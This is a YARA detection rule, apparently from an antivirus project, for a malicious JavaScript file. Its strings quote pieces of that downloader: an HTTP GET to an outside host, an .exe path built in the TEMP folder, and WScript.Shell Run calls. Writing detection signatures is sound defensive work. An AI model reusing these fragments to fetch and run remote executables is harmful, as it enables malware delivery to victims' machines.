rule sig_20160329_423de41bfe535ee28f45be5c8d538893 {
  meta:
    description = "datamaliciousorder - file 20160329_423de41bfe535ee28f45be5c8d538893.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "eed4a4e5ec73883f54a94f925f3168fcdef359a923d37e5958cf70a1d9e0d740"

  strings:
    $s1  = "tN[o](\"GET\", \"http://zilton.com/o9qwp\", false);" fullword ascii
    $s2  = "function Bv() {return qx[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"tGiABbfZP.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[Cl](Hy() * 11); if (tN[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "function pT(J, D){Zq = Zq * 1; return J - D;};" fullword ascii
    $s5  = "var qx = function l() {return WScript[sQ](\"WScript.Shell\");}(), c = 11;" fullword ascii
    $s6  = "function V(){return \"\" + g;};" fullword ascii
    $s7  = "function QS() {return ((ra == true) && (ra == hY)) ? 1 : Zq;};" fullword ascii
    $s8  = "function El(En){qx[\"Run\"](En, Zq, Zq);};" fullword ascii
    $s9  = "function PS(s) {var E = (1, 2, 3, 4, 5, s); return E;};" fullword ascii
    $s10 = "return pT(xU, g0);" fullword ascii
    $s11 = "function A()" fullword ascii
    $s12 = "function qa(){return sQ;};" fullword ascii
    $s13 = "var QU = new this[\"Date\"]();" fullword ascii
    $s14 = " while (Mk){" fullword ascii
    $s15 = "function Hy(){return 22;};" fullword ascii
    $s16 = "var yY = false;" fullword ascii
    $s17 = "var ra = false;" fullword ascii
    $s18 = "hY = true; " fullword ascii
    $s19 = "ra = true; " fullword ascii
    $s20 = "var hY = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}